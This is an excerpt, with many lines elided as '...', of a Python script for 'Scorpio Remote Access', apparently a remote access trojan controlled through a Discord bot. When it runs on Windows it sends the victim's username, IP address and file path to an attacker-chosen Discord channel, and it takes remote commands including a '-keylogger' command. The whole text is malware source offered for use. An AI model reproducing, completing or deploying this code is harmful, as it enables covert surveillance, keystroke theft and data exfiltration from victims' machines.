...
id = ur id
channel_id = the channel u want the messages to be send of
token = "the token of the bot dont forget to enable intents"
...
phantom = commands.Bot(command_prefix="Scorpio", intents=discord.Intents.all())
...
async def on_ready():
    ...
    if os_utilisateur == 'windows' and infos:
        ...
        try: 
            ...
            ip = "error"
        embed = discord.Embed(title="Scorpio Remote Access", url="https://www.github.com/areski1337", description="Prefix : [-]")
        embed.set_footer(text="Scorpio | Shinzo")
        embed.add_field(name="User:", value=user, inline=False)
        embed.add_field(name="IP:", value=ip, inline=False)
        embed.add_field(name="Fichier:", value=__file__, inline=False)
        await chan.send(embed=embed)

        lien = await chan.create_webhook(name="Scorpio")
...
async def on_message(mess):
    ...
    if content_list[0] == "-keylogger":
        ...
        if keylog == False:
            ...
            lien = await channel.create_webhook(name="Scorpio")
    ...
    if content == "-help":
        embed = discord.Embed(title="Scorpio", url="https://github.com/areski1337", description="Prefix : [-]")
        embed.set_footer(text="Scorpio | shinzo")
    ...
    if content == "-info":
        ...
        try:
            ...
            try: 
                ...
                ip = "error"
            embed = discord.Embed(title="Shinzo", url="https://github.com/areski1337", description="Prefix : [-]")
            embed.set_footer(text="Scorpio | Shinzo")
            embed.add_field(name="User:", value=user, inline=False)
            embed.add_field(name="IP:", value=ip, inline=False)
            embed.add_field(name="Fichier:", value=__file__, inline=False)
